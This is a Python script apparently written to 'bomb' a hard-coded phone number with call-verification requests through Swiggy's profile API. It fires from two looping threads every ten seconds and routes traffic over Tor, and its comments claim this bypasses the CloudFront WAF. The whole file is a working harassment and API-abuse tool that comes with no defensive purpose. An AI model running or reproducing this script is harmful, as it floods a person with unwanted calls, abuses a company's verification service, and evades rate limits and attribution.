#!/usr/bin/env python3
"""
Swiggy Call Verification Auto-Bomber — Tor Mode
Har 10 seconds mein Tor ke through request bhejta hai
CloudFront WAF bypass karta hai
"""
import requests, time, threading, sys, os
from datetime import datetime

# ========== CONFIG ==========
PHONE = "8922062621"
INTERVAL = 10       # seconds between fires
THREADS = 2         # parallel threads
# ============================

URL = "https://profile.swiggy.com/api/v3/app/request_call_verification"
HEADERS = {
    "Content-Type": "application/json; charset=utf-8",
    "User-Agent": "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.165 Mobile Safari/537.36",
    "Origin": "https://www.swiggy.com",
    "Referer": "https://www.swiggy.com/",
}
PAYLOAD = '{"mobile":"%s"}' % PHONE
PROXIES = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}

counter = 0
stop_flag = False

def fire():
    global counter
    try:
        r = requests.post(URL, headers=HEADERS, data=PAYLOAD,
                          proxies=PROXIES, timeout=15)
        ts = datetime.now().strftime("%H:%M:%S")
        counter += 1
        if r.status_code == 200:
            d = r.json()
            code = d.get("statusCode", "?")
            msg = d.get("statusMessage", "?")
            print(f"[{ts}] #{counter} | 200 | {msg}", flush=True)
        else:
            print(f"[{ts}] #{counter} | HTTP {r.status_code}", flush=True)
    except Exception as e:
        ts = datetime.now().strftime("%H:%M:%S")
        print(f"[{ts}] #{counter} | ERR {type(e).__name__}", flush=True)

def worker():
    while not stop_flag:
        fire()
        time.sleep(INTERVAL)

def main():
    print(f"🔥 Swiggy Auto Bomber — Tor Mode", flush=True)
    print(f"📍 {PHONE} | ⏱ {INTERVAL}s | 🧵 {THREADS} threads | 🌐 Tor SOCKS5", flush=True)
    for _ in range(THREADS):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
    try:
        while True:
            time.sleep(0.5)
    except KeyboardInterrupt:
        stop_flag = True
        print(f"\n🛑 Stopped | Total: {counter}", flush=True)
        sys.exit(0)

if __name__ == "__main__":
    main()
